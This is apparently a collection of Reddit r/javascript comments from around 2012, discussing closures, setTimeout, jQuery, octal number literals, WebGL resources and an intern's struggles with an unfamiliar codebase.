You can't get the content of a page on a different domain because of the cross-domain policy. But you can use a server side script, like a stub, to fetch a page and get it into JavaScript. Of course if you're gonna do that you might as well do the regex or whatever processing entirely on the server side, like with [QueryPath](http://querypath.org/) which is like jQuery for PHP.
Without reading too much into it I see a problem with the setTimeout closures. setTimeout((function(){ // this will be run right now, then setTimeout will be given whatever it returns (nothing) })(), 1000); setTimeout((function(theWord2){ return function () { // runs in 1 second with theWord2 nicely locked away from the loop } })(theWord), 1000); I agree with the comments I see so far, you could use some better organization and variable names. 
*start trolling* "...No dependencies..." "Levereges moment.js..." *end trolling*
Fairly hazardous to give users the impressions "p4$$w0rd" is a "Strong" password. (according to the linked to demo site)
I think I'm quite lucky in that I started webdevving before jquery came along, else I probably would've been too lazy to go back to learn vanilla js.
I agree, when you try to actually read the code, ruby has fewer characters, but more syntax. you have to know what .. and numerous other cryptic reserved characters do, and it isn't obvious in itself. &amp; does something... but what? you can call a function just by invoking it's name, without brackets, so it's really hard to know whats a variable, function, keyword, etc. Some of those examples are clearly written to make ruby look cleaner. Needlessly doing complicated things in javascript to make it look worse. Who wants to multiply strings anyway? 
Good work. I wasn't expecting it to be so featured. 
Looking to implement this on our app - your competition is [this tool](http://mootools.net/forge/p/mootools_datepicker), right now :) Kalandae's date range selection is nice... might mean we can get rid of the "end date" field on our forms. Can you throw up a [jsFiddle](http://www.jsfiddle.com) for the lazy?
 a.map(Function.prototype.call, String.prototype.trim); That's pretty clever. Overall they're my two favorite languages. I find myself doing a lot more functional and 'metaprogramming' in JavaScript then I do in Ruby, even though they both have very similar capabilities in terms of reflection and introspection. JavaScript lends itself to functional much better than Ruby, I find.
... assuming you're running the latest version of jQuery. We're still using an old copy because there were some behavioral changes that meant shit broke when I dropped in v1.7 and the release date was coming up too soon to make it worth switching. Fortunately, we release in the next few weeks and I can finally upgrade all the third-party libraries!
This sure isn't a bad way to do it, but then you end up with another issue: tracking down functions by name. I'm currently struggling with updating legacy code at work: a single file has half a dozen different objects which follow an interface-implementation pattern, so it's distressingly easy to lose track of which prototype I'm currently in when I ctrl+f function name.
What about internationalization?
Well, personally I also like JS syntax more, but hey, ruby's also great. You can't write big serverside apps using only JS (yeah, I know about node, but why would you use a magnet when you need a gauss rifle?) P.S. Тема, ну ты прямо ваще тролль мирового масштаба, прямо ваще Мурдокай
WAT
Fantastic! Now I can stop using the jQuery UI date picker.
I made it touch-compatible and it seems to perform ok on my iPad 2. :)
You can go arbitrarily far by just sticking to the top ;)
Yeah I considered making a GameObject that has x, y, vx, vy and that stuff, but I was already far enough along that I just finished it up. I might refactor it this weekend a bit.
About how many hours did it take you?
Maybe 6-10 hours? I'm not really sure. There was a lot of tweaking involved.
yeah - there're quite a few breaking changes in the latest version which means one of the projects I'm working on is stuck at 1.4.2 :/
You should consider making it a [webapp](https://marketplace.mozilla.org/en-US/login?to=/en-US/developers/). Users will be able to play it on native desktop, in browser, or on mobile device (including Android).
yes, I know, I was being an ass on purpose. Just sounded a little funny to me. I'm sorry :p
Your punishment is to take a photo of yourself with a shoe on your head while feigning interest in a copy of "Javascript: The Good Parts". All while playing the air guitar and singing showtunes.
I found it fun for being so simple. Less is more!
Nope, `this` will refer to the anchor element.
Void is an operator, read about it here: https://developer.mozilla.org/en/JavaScript/Reference/Operators/void
The edit tool I use (netbeans) allow me to "go to function declaration" quite easily. That said I moslty use it as: $(function(){ /** Binds */ $('#button').on('click', buttonClick); $('#input').on('click', inputClick); /** Functions */ function buttonClick(){} function inputClick(){} })
Intriguing! Do you use that instead of hanging dogballs (or similar hack for immediately-invoked functions)? Also, even though JS inserts semi-colons, why don't you? It's like leaving the periods off sentences While the reader can figure out where it starts and stops it's harder to follow
Nifty. How about your semi-colonless style?
I don't have it installed on my home PC, but I see no reason why it shouldn't work. I also feel like Visual Studio should have a similar feature, at least for other languages, but I have had similar feelings about other tools and other features be wrong before.
VS can be a little lacking in JavaScript Intellisense, although it's pretty decent. If you assign an object to a variable locally (or in an obvious closure), it can usually sniff that well enough. However, it's (unsurprisingly) not smart enough to pick up on closures or objects which get passed in.
A-hah, that's what I deserve for redditing on my lunchbreak. And to you *I say, take your implicit semicolons and shove 'em in /r/coffeescript =p
A template is just a Gist (see: https://gist.github.com/1992850) To create and use your own, just create a gist of the template you want and then go to http://plunker.no.de/edit/from:GISTID. It will eventually be able to interact in a logical way with Github's Gist.
I'm just working on adapting some of the css so that it could be embedded as-is (through responsive shinanigans). This alerted me to some weird behaviour caused by Bootstrap when the window is reduced horizontally.
yep
Avoid writing anonymous functions var anonymous = function(){} ... Into something that can be debugged via call stack var nonanonymous = function nonanonymous(){} Would be a start.
https://github.com/ericmatthys/flutter
Bad, bad code. For each button press, this code: * Regenerates an array that remains the same for the duration of the page. * Regenerates a sum from that array that also (shockingly) doesn't change between calls. On top of that redundancy, there are several unnecessary closures. These complicate things and make the control-flow needlessly difficult to follow. [Fixes](http://jsbin.com/oxohay/edit#javascript,html)(or see the [gist](https://gist.github.com/2004247)): * Used the **sole** required closure to hold the *finalParts* array once it is generated across multiple invocations of the onclick handler. * Removed the two functions within *symmetrizeBodyParts()* that serve no purpose and replaced them with a shorter and more readable loop. * Removed *targetsSum()* as it is no longer necessary because sum calculated while we build the array in *symmetrizeBodyParts()*. * Normalize the part's weight during array building so that all the weights sum to 1. * Removed *target()* because we just need a standard random value of 0 to 1. * Removed *targetHitFunction()* because all its functionality is replaced with a one line loop within *attack()*.
Yeah pretty much. I had to look at some examples of how to use the canvas (like rotating the bird turned out to be a little trickier than expected). [Mozilla has a pretty good reference for that.](https://developer.mozilla.org/en/Canvas_tutorial) 
If you are in a .NET environment, check out [Fizzler](http://code.google.com/p/fizzler/) which is like jQuery for .NET..
Thanks for taking the time and effort to comment on my code and to offer a counter example. That's a really nice thing to do, and I hope you don't take my comments as negative criticism. They're merely my attempt to explain what I see as the tradeoffs in the two approaches and to explain some of my intentions. The main difference between your code and mine is that mine is written in a functional style, while yours modifies the variables passed to functions. I'm not sure which is better. You've pointed out the deficiencies in mine. For your code, I would say: * It could be difficult to understand the relationship between the initial list of body parts and the final list, or the list of parts in any function. For example, what does the list of parts passed to normalizeBodyParts look like? It's impossible to tell unless you've followed all the function calls up to that point. In fact, most of your code might be better written as a giant function which sets up the final array of body parts and weights. The dependencies are there, so one might as well make them explicit. * The initial list is destroyed, making it impossible to reuse. As a general consequence of not writing in a functional style, it seems like it would be more difficult to scale the weights of the body parts. For example, if the giant were attacking the hobbit, the weights might be scaled to favor the upper body. You can't really do that here because the master list of body parts is destroyed. * Another result is that it's more difficult, for example, to expose body parts as degradation from damage occurs. It's also a little more difficult to play around with adding body parts in the console. It's interesting to me that you consider the closures unnecessary and burdensome. The targetHitOne in particular makes perfect sense to me because it's a pattern I've seen numerous times. It's also something that I wanted to included specifically because it's a neat pattern, though not necessarily because it's superior to any other approach. I debated over using "finalParts" in the "symmetrizeBodyParts" function. In the end I kept it like that because it's different from what I'm used to in Javascript (along with the functions "that serve no purpose" - except to show recursion, even if it's needless). Thanks again.
I'll write about it and pm you
Nice work and a clean coding style. 
use backbone.js?
Ah, that's definitely helpful. But how do I actually get the stack trace of anything? The Firefox error console only shows the line at which something went wrong.
&gt; but I think that 'new' before 'function' is unnecessary. Worse, it's completely broken: `new function() {}` will use `function() {}` as a constructor (and try to instantiate it), which will call it (with no parameters, the parens are optional on constructors if you don't want to pass parameters). So this.movedBy = new function(l, c){ return new Position(this.l + l, this.c + c); } is actually a more complex way to write: this.movedBy = new Position(undefined + undefined, undefined + undefined); And since we're *already* in `Position`'s constructor, we end with an infinite recursion as trying to create a new `Position` itself tries to create a new `Position`.
This is pretty cool. :) One weird thing I noticed though, in Chrome 17 when I am on another tab and control-tab over into your game, it moves VERY FAST for a second or two and then returns to normal speed. It doesn't seem to happen every time.
It seems to be very slow on the mountain picture.
Great job! Nice game to teach yourself with and very well done.
Much better now. Very cool!
I liked it...saw demo immediately (didn't have to hunt), good explanations, code is available for inspection. Not super practical but that's what R&amp;D is about.
This should do the trick and get you a *clean* link: var anonymouse = "http://anonymouse.org/cgi-bin/anon-www.cgi/magnet:?xt=urn:btih:5d7c306e862491da4cd9b33b1cb99fc311421b36&amp;dn=Archer+2009+S03E08+PROPER+HDTV+x264-COMPULSiON+%5Beztv%5D&amp;tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&amp;tr=udp%3A%2F%2Ftracker.publicbt.com%3A80&amp;tr=udp%3A%2F%2Ftracker.ccc.de%3A80"; var magnet = anonymouse.substr(anonymouse.search(/magnet:\?xt=urn:/)); alert(magnet); This one should iterate, find the links and remove the anonymouse string: nodes = document.getElementsByClassName("download"); for (var i = 0; i &lt; nodes.length; i++) { link = nodes[i].children[0].getAttribute('href'); idx = link.search(/magnet:\?xt=urn:/); magnet = link.substr(idx); nodes[i].children[0].setAttribute('href', magnet) }; You could use [this userscript](http://userscripts.org/scripts/review/67926) as starting point.
Basically, you need to scan the page and look for magnet links and then modify the href to remove the anonymouse portion. Look into using: • document.getElementsByTagName() to get the links • a for loop to examine each link (looking for magnet) • RexEx or String.replace() to change the href 
Thank you!!
Hey, is there any advantage coding your game object like this var Flutter = (function () {...})(); instead of var Flutter = {init:function(){...},something:function(){...}} // and create new object Thanks for posting the git hub, I'll be learning from your code all weekend :D
That's looking good, but your `moveBy()` is more like a `moveTo()`. :-) A couple of plus signs should do the trick... function Position(linie, coloana){ this.l = linie; this.c = coloana; } Position.prototype.moveBy = function(l, c) { this.l += l; this.c += c; }; 
I agree. Owning up to a mistake is the right thing to do. The blame game is as old as time.
JSLint identifies the problem: &gt;Problem at line 5 character 20: Weird construction. Delete 'new'. Use machines first, humans second.
&gt;I'm developing a reaction time script for psychology research You might also want to read this article on the [accuracy of timers in JavaScript](http://ejohn.org/blog/accuracy-of-javascript-time/) and make sure that the browser that you're using has a high enough resolution for your experiment.
I can tell you have invested a bit of time into this, it would be really nice if you could put together a nicely formatted readme which documents how to use your library. You might also consider packaging your library into a global name spaced object. So that one might be able to call solarCalculator.findRecentSunrise(jd, latitude, longitude) Also it looks like you have a lot of code here just to handle dates, [javascript has a native Date\(\) format](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Date). I suspect you will be much happier using it. 
Catch the error. The Error object will have a stack property containing a stack trace (this is a non-standard extension of Error, but FireFox provides it)
Dammit, I could have saved a lot of time. I swear I googled it. Oh well, it was fun. A readme is a given. I wanted to upload it immediately, but I need to document it for the people I assembled it for, anyway. Thanks for all of you input! Upvotes for you!
Also, the code is ported from the NOAA ESRL's version (cited in source) and, yes, it's *awful* but functional. It's like 12 years old. I left most of it intact because that's not how I approached the project because it had a deadline. Now I can start making it more efficient.
Does anybody likes it?
Would appear not.
Why?
You.. You _WHAT_ ? DO PENANCE. Now. [edit - upvote anyway]
thanks, but unfortunately I'm not able to edit the .php file because I'm using the free version, and I can't upgrade it without moving my blog. thank you for your effort, I really appreciate it.
I didn't realize you were using wordpress.com for your hosting. If you do ever move your hosting, I hope this code helps you out one day.
no, they won't let me upload or edit the files. I already saved the code so that I can use it whenever I find a way to upload it.
Seriously, if I had kept that tab opened a tad longer I wouldn't be surprised if my Firefox had crashed.
I discovered github has a hard filesize limit at 1 meg exactly so I had to trim it down a bit, some useless stuff, to get it down below 1024k.
Why would you want to do this? 
I .. What do you mean by 'Windows headers' ?
Highcharts is what I went for in the end, and I love it. Can't believe I was even considering any of the other options to be honest. One of the best bits about HC is its documentation - dull I know, but a critical part that some libraries seem to be missing entirely! Docs: www.highcharts.com/ref So yep, very happy, well worth spending the money in this instance.
I hope you didn't do that manualy;). One more thing... what about the copyright?
I...I don't...
following up, here's a preview - it's incomplete but this is a start... [http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/](http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/)
following up, here's a preview - it's incomplete but this is a start... [http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/](http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/)
following up, here's a preview - it's incomplete but this is a start... [http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/](http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/)
following up, here's a preview - it's incomplete but this is a start... [http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/](http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/)
following up, here's a preview - it's incomplete but this is a start... [http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/](http://www.reddit.com/r/javascript/comments/qr52s/update_a_preview_of_my_cross_browser_extension/)
I typed it in the command line without the comma. And I had the semicolon too. I still get nothing.
Thank you!
Like what "other stuff"? That might be a little helpful. It sounds like you aren't even running node.js when you use the node command because *node -v* should just return something like: v0.6.8 I would check my PATH.
I am so mystified by the missing verb in your title. 
Would be interesting to get some back story onto why this is being done (I assume Win32 API in Node?) and how (probably some regexp fun or a kickass C parser). I'm concerned about those object literals in structs and methods. ES5 (and ES3) do not define iteration ordering for object properties. See the [spec on `Object.keys`][1], for example. Not a deal-breaker (as all popular JS engines iterate on insertion order (and insert by forward lexical order for object literals)), but still something to keep in mind for portability. If other attributes to parameters and structure members need to be added (`const` and `volatile`, compiler attributes, etc.) or if names can be omitted in prototypes, I can definitely see something like Method('ImmGetIMEFileNameW', UINT, [ { name: 'HKL', type: HKL }, { name: 'lpszFileName', type: LPWSTR }, { name: 'uBufLen', type: UINT } ); being more useful (and avoiding the problem I mentioned earlier). [1]: http://es5.github.com/#x15.2.3.14
Lovingly referred to as windows.h, but that's just the entry point. It's all what makes up the `include` directory with the Windows platform SDK and includes all the headers define the Windows API available in user32.dll, kernel32.dll, and a half dozen other major ones. It's what makes Windows Windows and it offers a hell of a lot of functionality if you can just get at it, which you need FFI to do from a dynamic language like javascript. And you need these definitions.
So you did that? Niiice.. First time I see something like that done in Javascript. Myself I'm your average Java/Python TPS reports-kinda business application programmer, so I got really impressed with that cool 2D fractal math wizardry of yours. Upboat!
I will eventually, when I get another computer. 
Maybe you mean your current computer has low specs and is unable to handle a virtual machine, but in case you're not familiar with VirtualBox: Check out https://www.virtualbox.org/ It's a piece of free software that lets you run a virtual computer within your existing computer. In your case, you could run a Linux distribution in it, while keeping your windows setup unchanged. The trade-off is that you need to give the virtual computer some amount of RAM and HD space to thrive. At a minimum, I'd recommend 512MB of RAM, and 10GB of HD. Note that the RAM is only in use when the virtual machine is running, so really it's not much worse than having a few chrome tabs open. About running Node in windows: You'll find that a number of packages on npm aren't really working out of the box on windows, because they rely on native libraries that are commonly found on linux and osx. Equivalent libraries most likely exist on windows, but it's unlikely most package authors have bothered to test them, so things may require more tweaking than expected. This may get better as people get used to the idea that node can run properly on windows (a relatively new development in itself.) 
It's a good idea for mobile. Outside that, I don't really see much advantage. http://caniuse.com/sql-storage There's also IndexedDB, which is document (object) based instead of table based. http://caniuse.com/indexeddb I don't know if this will be helpful, but I wrote a little library to help with the API. I really don't like it, so I built something I like better. I've used it on a few projects and it works well. Worth checking out. https://github.com/psayre23/WebSQL
What are you trying to do exactly?
Id to class..
injection Base64 image data into DOM is a terrible idea! 
Command and Conquer - HTML5 - Progress update and Demo - This is a demo of the new version I am working on, with more units, levels and multiplayer support... http://www.youtube.com/watch?v=lorDK_gY3CI
Wow cool thanks for sharing
I came here to say the same thing.
CommonJS-ify it!
&gt; Why are these html files? And not indented... It is a complete example, including some markup and format. I have trouble reading the code though, it needs some proper formatting. Will try a test run tonight.
I don't really know a whole lot about CommonJS. What would that involve, and where should I start?
Thanks, I'll give that a try.
I wasn't able to get the code working using this solution, however, someone else suggested adding a flag to avoid adding additional instances. The final solution was to create a global variable (count = 0) and increment it each time sireTimer() was executed; then I added a check to the beginning of the sireTimer() function that runs a clearTimeout(duration) if count is greater than 1.
His solution doesn't really change anything, but not having var duration = ... you're making it a global variable anyways, so defining it outside of that makes no difference. You can call clearTimeout on a null value with no harm done, and assigning a variable the return value of setTimeout just returns an integer value of the ID of the timeout, so you want to do something like this: var sireTimer = function () { var duration = null; return function (indexNext) { // waits specified time before calling the function again for the next list item. clearTimeout(duration); duration = setTimeout('sireImage(indexNext)',5000); } }​() That will encapsulate the duration, and call clearTimeout every time before it reassigns the duration, so that you only have one timeout running at a time. 
I don't think that simply declaring the variable in global scope is going to help. It seems to me that you need to clearTimeout(duration) before setting another timeout. **EDIT - Wow I type slowly.**
Yes, someone told this to me, but I just dont understand how it is used, but I just thought about it a little bit. Is it that Javascript doesn't have like, a huge library of functions it can rely on, so JQuery was developed to make simple things that all programmers would find useful available to all programmers? 
For animations of any kind, instead of trusting the timer period, you need to keep a clock reference and compare against that. Increment a timeout value and test when the current time passes it. In the following, "resolution" is simply how often you want to check the clock. /** * @param period the number of milliseconds between calls to * cbackFunc * @param resolution milliseconds between clock-checking * @param cbackFunc function to call at timeout */ function Timer(period, resolution, cbackFunc) { var timeout = new Date().getTime() + period; var keepGoing = true; function checkPeriod() { var tim = new Date().getTime(); if (tim &gt;= timeout) { cbackFunc(); timeout += period; } if (keepGoing) { setTimeout(checkPeriod, resolution); } } this.start = function() { keepGoing = true; timeout = new Date().getTime() + period; setTimeout(checkPeriod, resolution); } this.stop = function() { keepGoing = false; } } var timer = new Timer(3000, 500, function() { var statusTxt = document.getElementById("status"); statusTxt.textContent = "time: " + new Date().getTime(); }); 
Hmm, I don't really consider programming "computer related" any more than I consider mathematics to be "calculator related". Personally I hate computers, I refuse to take one apart, but I have to deal with them since I love the internet and I love programming.
Well - I'm not sure what I want to do yet. Programming is computer related - as most computer scientists become programmers. I'm talking about majors/fields here. I'm a computer engineering major, testing the waters before I jump into anything. I love the internet too - and I love programming sometimes, well, when I know what I am doing. 
First things, how well do you understand the DOM? Without knowing the DOM, jQuery will seem like some mysterious beast even though it is really quite simple. jQuery is to the DOM as SQL is to the database. I understand that you can't publicly post code. While I don't know a whole lot about C#, I like to think of myself as a JS expert. If you need help go ahead and send me a private message and I will do my best to answer your questions.
'duration' doesn't matter. It only holds a reference to the timer index. The only way you will have several instances is if the timer is called multiple times (which it may be, we can't see the rest of the codebase.)
Ask for help! You're an intern and you're supposed to be learning. There is nothing wrong with asking questions. The majority of what I know comes from talking over problems with coworkers. Collaborating is how you develop better programming skills and should be a part of your internship. Just ask to talk over the problem with one of the programmers your working with. Explain that you are unsure how to go about implementing the solution. If he is worth is weight as a programmer he will show you the right direction. Trust me. I would rather an intern ask me for help then make a mess of buggy code. Part of learning is asking questions and you don't want a bad rep for doing a bad job. 
* Word wrap: DONE * Better frame control: DONE * vi(m): TODO * Live collab: On the backburner * jsHint/Tidy: DONE Check it out: http://plunker.no.de
There is now support for beautification AND jsHint through the live-compile feature. Check it out http://plunker.no.de
Get out while you can!
But internships are where you're supposed to learn your craft. How will you learn if you're reprimanded for asking questions? This isn't the last internship on the planet. If you were an intern at my business - and yes I own a business - and you didn't ask questions, I kick you out the door.
Well this is besides the point. I'm sure it will get better. I don't know what to do now though. The problem is that my boss says I can ask him questions. Sure, as long as I know the question I am asking. If I can "ask the right question" I can ask him. But I need help writing this code just as much as I needed help understanding it. He helped me understand it a little better, but he says he's not familular with the code or the way its written. The developer who programmed it, however, I used to come to him with questions. Then he must have complained to my boss that I was impacting his productivity, which has left me here in this situation. 
I really appreciate this. Thanks!! I guess this is that "first hurdle" stage. I'll definitely poke around reddit with firebug ...(already have it installed) 
/sigh It feels like they hired an intern for free labor.
I'm paid. So right now it feels like they pay me to work lousily. 
I'm sorry you're stuck in this situation. I am a C# programmer myself and I got marching orders to convert a site based on ASP.NET to a jQuery/AJAX/JSON version. So I can relate. It took me a couple weeks of floundering around before I grokked javascript. Best of luck to you. Fortunately my boss is my uncle who's very laid back and generous with his knowledge. Wish he was your boss too, he pays well!
You should be able to get a good grasp of javascript by reading tutorials online since you know C# already. Below are some videos to help you. [This video is great(jQuery)](http://www.youtube.com/watch?v=8mwKq7_JlS8), if you can get past Dmitri's poor job as a public speaker. [This is also a good video, but not until you've got the basics down.](http://www.youtube.com/watch?v=hQVTIJBZook)
*feature suggestions:* 1. allow cell note-taking, OR automatically report which numbers can fit into which cells 2. clicking on cells highlights same number across all cells, optionally shades grid of cells that number placement "blocks" (horizontal, vertical, and per-box cells that are no longer eligible to be filled with that number) *bug reports:* 1. 0 was allowed as a valid character in cells. (should be `/[1-9]/`) 1. it's possible to get a game configuration with multiple possible endings. not sure if that's valid sudoku or not. my game board, for reference: 3 8 9 | 7 2 4 | 6 1 5 6 5 1 | 3 9 8 | 4 7 2 7 4 2 | 1 5 6 | 8 3 9 ----------------------------------- 8 3 7 | 4 6 2 | 5 9 1 5 2 6 | 9 1 3 | 7 4 8 [9][1] 4 | 8 7 5 | 3 2 6 ----------------------------------- 4 6 8 | 2 3 1 | 9 5 7 2 7 3 | 5 8 9 | 1 6 4 [1][9] 5 | 6 4 7 | 2 8 3 The bracketed numbers were interchangable.
Looks good. Only thing's I would change are cashing images.length in sireImage() (because you should always try to do that) and to use the [third parameter](https://developer.mozilla.org/en/DOM/window.setTimeout) for the setTimeout call: setTimeout(sireImage, 5000, index + 1)
definitely will check these out once i have some time, thank you!
I've seen multiple places that mention caching the length, but in testing on Chrome 17/Firefox 10/IE9 (just now) it's actually faster to just use the length value from the array object: http://jsperf.com/array-length-overhead (The tests are valid, the setup on this page is fubar, but it doesn't impact the test.) All it's doing in most cases is referencing a stored value on the array object so caching it is actually creating a new variable to hold a copy. I've seen/used the parameter list for setTimeout, but for some reason I find it "clumsy". I keep thinking that some browser out there doesn't support it (maybe IE6 is where I get that from?) so I tend to avoid it still. Edit: Yeah, older versions of IE ignore the extra params: http://www.dmuth.org/node/1252/msie-javascript-annoyances-using-parameters-settimeout Edit2: Looks like it still plagues IE: http://webreflection.blogspot.com/2011/05/settimeout-and-setinterval-with-extra.html
yes i have Firefox. I'm definitely going to read up on everything people have posted here, but imbcmdth looked at the code I was working with and offered a very easy and straight forward explanation of what was occurring....and even gave me some tips on the best way to go about solving it. It really helped. Now my only problems lie with the C sharp code I wrote - I think the Javascript is just what I need, but I'm questioning the code I wrote because I feel it can be optimized. I will definitely use all the very fine suggestions everyone offered here to help me learn when I can do it in my free time. I'm on the clock so I want to get the work I need to get done first, then I can fill up free time learning all this great stuff that was given to me here. 
The "old way" of manipulating elements was very clunky. For example, to find all the siblings of an element you would have to do this: `var foo = document.getElementById("bar").parentElement.children;` jQuery makes it much easier to target the HTML elements you want to modify: `var foo = $('#bar').siblings();` The part inside of `$(...)` can be any valid CSS selector (like you would use in your stylesheet). jQuery also has some special selectors to make it even easier, like `:hidden`. **Selecting elements with `$(...)` is *usually* the first thing you do**. Once you have your selection you can do a few things with those elements: 1. **Traverse the DOM tree**. Easily find sibling/parent/child elements based on the current selection. For example, `$('#username').closest('form')` will return the `form` that contains the login `input` 2. **Modify the elements**. You can call `.hide()` to hide them all, `.css()` to apply styles to them, etc. 3. **Listen for events**. You can have code run when any element is clicked, a key is pressed, etc. This is only a small fraction of what jQuery does. I would highly recommend finding some good tutorials and reading the documentation.
Why does this french guy have to mess around with his voice, I can't understand shit of what he's saying.
41
Don't do this: monthList[i++]. It's harder to read then monthList[0], monthList[1], etc... In your use case you could've just used monthList.push(new month(...)); It's popular to use the literal syntax for things like objects and array instead of their constructors. For example, use var array = []; instead of var array = new Array(); You can define multiple vars in a comma separated list: var z = 'blah', f = 'foo', rainbow = 'bar'; All of your functions are in the global namespace (i.e. on the window object in the browser). You might want to stick them all in a single object or wrap this stuff up in a self executing function. 
I can't tell because it requires a login. Are you asking how to created a 2D array?
There's a strange dynamic in development. Seemingly simple questions are somewhat frowned on... unless coming from someone with sufficient reputation. So... a simple question from an intern is dismissed, while the same question from a key developer on the team is answered without fuss. There was a paper about this years ago featuring one team at HP... but damn'd if I can find it. Kind of sucks when you're on the short end. On the plus side... they're paying you to learn interesting things. You just need to use google, stackoverflow, reddit for answers/guidance. 
n00b here: anyone know of any good resources for learning about webgl. Obviously I m going to google also. but if you know of any good books related to javascript webgl html5 graphics, I would appreciate it titles and opinions on them.
What an awesome experiment! Great Work!
There's www.webgl.com for daily blogs, www.learningwebgl.com for standard tutorials and then there's www.learningthreejs.com which has more cutting edge tutorials.
He is saying GL_TEXTURE_2D told you wrong. The following: $('#divone').append('&lt;p&gt;Test&lt;/p&gt;'); is really jQuery's shorthand for $jQuery('#divone').append('&lt;p&gt;Test&lt;/p&gt;'); The use of $ is explained more here.... http://api.jquery.com/jQuery.noConflict/ 
I suggest the interactive version. It has it's own javascript console. I used it to test on my own to verify I was grasping the material.
I'm not sure about the feasability of this and I'll tell you why: I'm not a new intern. I'm a couple of months in, actually. They already expect me to know things. But I've worked on and completed my own project which didn't involve code written by anyone else. The first few months, my boss was so busy that he couldn't give me direction on the projects they were working on. Now that the second release is out, I am being put head first into the third version, but I don't think they understand there is a learning curve. There is no documentation for this project. My boss didn't review the code of it so he doesn't know the details of what is happening in it (just general functionality), and like I said, I am being actively discouraged from seeking help from the person who wrote it. I never get responses on IM, and I'm very discouraged from even asking small questions, because I should be able to figure those out on my own. My best bet is to try my hardest and schedule Code Reviews with my boss and the programmer who wrote this code so they can view the results of my work before they can approve it. Taking additional time out of their day, however, doesn't seem to be much of an option. They are a very fast paced group. But my boss is willing to help me learn how to debug the code to figure out the problem, as long as I know how to ask the "right" questions. But most of the questions I need to ask I know he won't be able to answer easily, which is why in the past I went to the programmer who wrote it. Since he is no longer an option I have to just try to do it on my own. I'll use Reddit/Stack Overflow for help from now on with small programming things. :) Bigger things I will discuss with him. :) Thanks for the tips. 
Thank you. The analogy of it being like an SQL statement REALLY helps in my understanding. I was completely off track before. :) 
COME ON. You just sank my depression to new depths. That is the best site header I have ever seen
This, my friend, is about as far as you can get from jQuery and still be writing JS in the browser. If you really want to get your feet wet with this type of stuff, a good place to start is to learn C and then OpenGL. If you're too squeamish to go down that road, start off with a JS framework like [Processing](http://processingjs.org/), [three.js](http://mrdoob.github.com/three.js/) or [Raphael](http://raphaeljs.com/), they're all well documented and can be a good quick start to learning about graphics rendering. 
But it's not as hard nor as sophisticated as it looks: It's just two 2d, radially uniform particle emitters, with the mouse location functioning as a radially uniform repulsor when the left mouse button is pressed.
In a way, I'd caution you when learning Javascript to clear some of the C# notions from your head. Javascript is a truly different beast, and looking for some things that you find in C# (statically typed variables, traditional object-oriented constructs) are just going to throw you off course. It sounds from the comments like you've got the jist of jQuery being essentially a DOM querying library - this is good! To tell you the truth, you're already significantly ahead of many web developers I've run into over the years, who've just dismissed jQuery as "magic" or something not to be bothered with. I know it sounds silly, but there's people out there making lots of money who still harbor these feelings! Next, try your hand at learning Javascript outside of the context of jQuery and the DOM. My personal recommendation for a book is: Javascript, the definitive guide (http://shop.oreilly.com/product/9781565923928.do) This is the book that made me have what I call my "coming to Jesus" moment with Javascript... where I realized just how different Javascript was from C#, and how a developer can embrace those differences to make very powerful and elegant constructs... and how I shouldn't be fighting the language by trying to make it feel more C#-like, but rather embrace those differences. (You'd be surprised the extent to which you can go to try and make Javascript feel more like C#. Whole libraries exist that, for example, attempt to emulate traditional Object-oriented constructs... don't use these!) I highly recommend it!
Thanks again!! I have so much reading to do on Javascript now. I hope learning Javascript doesn't stop be from understanding C#. I kind of have a good understanding of it but I'd say it is a decent understanding at best.
Thanks for the downvote, random person. I guess this was a stupid question but answering it would have been more useful.
This has nothing to do with jQuery. jQuery is written in JavaScript, but it's '*only*' a toolkit for abstracting cross-browser DOM manipulation, events, CSS and AJAX. Everything you can do with jQuery can be done with plain old JavaScript without the use of any library. Read a [canvas tutorial](https://developer.mozilla.org/en/Canvas_tutorial) if you're interested in writing these kind of graphic demos. And forget jQuery. You don't need it for that.
three.js is a library for working with canvas elements. It is written in plain JavaScript. The only prerequisite you need is a browser that support s WebGL. WebGL is an API for exposing OpenGL to JavaScript, nothing more.
The header has nothing to do with JavaScript. It's based on CSS transforms.
&gt; I have been discouraged from asking for help to write code. This is what I like to call a "red flag"
If you put a zero in the beginning of a number, javascripts (like most programming languages) treats it as an octal unless you use strict mode.
The leading zero makes it an octal. So, oct 011 = dec 9
Thanks so much for the fast answers! And even a solution! Why does it guess octal before any other numeral system? In my experience I've only had to use binary, hexadecimal, and decimal. Also, what is octal even used for?(Less space-efficient than dec)
only &lt;1k of js and the server is down anyway :-))
It is generated using a CSS3D renderer for Three.js. JavaScript is most definitely involved.
because putting a zero in front is the convention for labelling octal numbers. just like 0x is for hex, and nothing at all is for decimal. http://en.wikipedia.org/wiki/Octal#Usage
Like Hexadecimal (Base 16), Octal (Base 8) is well suited as an alternative representation of binary numbers, as all powers of 8 are also powers of 2.
To start, python + openGL is easier to learn in my opinion.
Ah yes, the fabled radix parameter. I suggest using jshint to discover issues like these.
Oh, I was under the impression that it was pure CSS transforms.
For 3d js my suggestion is to check out the three js library unless you're already a graphics programmer. The tech is too young for there to be a lot of good books, I think the Internet is a better resource for this. For JavaScript in general, check out Douglas Crockford's "JavaScript: The Good Parts."
Sorry, taking me longer than I thought to get free-time to properly test this.
I read this as October 11th == December 9th.
Pity. So have I, I was wondering about your opinion, I'd like to know what the fuss is about :-)
:-) I read an article, it was titled how Coffescript is contributing to bad JS developers
Do you have a link for that? I'd like to read it as I have suspected the same thing.
Yes that is quite confusing. I look at my blog posts related to prototypal inheritance and laugh at myself. I would recommend reading Steve Souder's books on high performance websites. He explains closures and prototypal inheritance and other things.
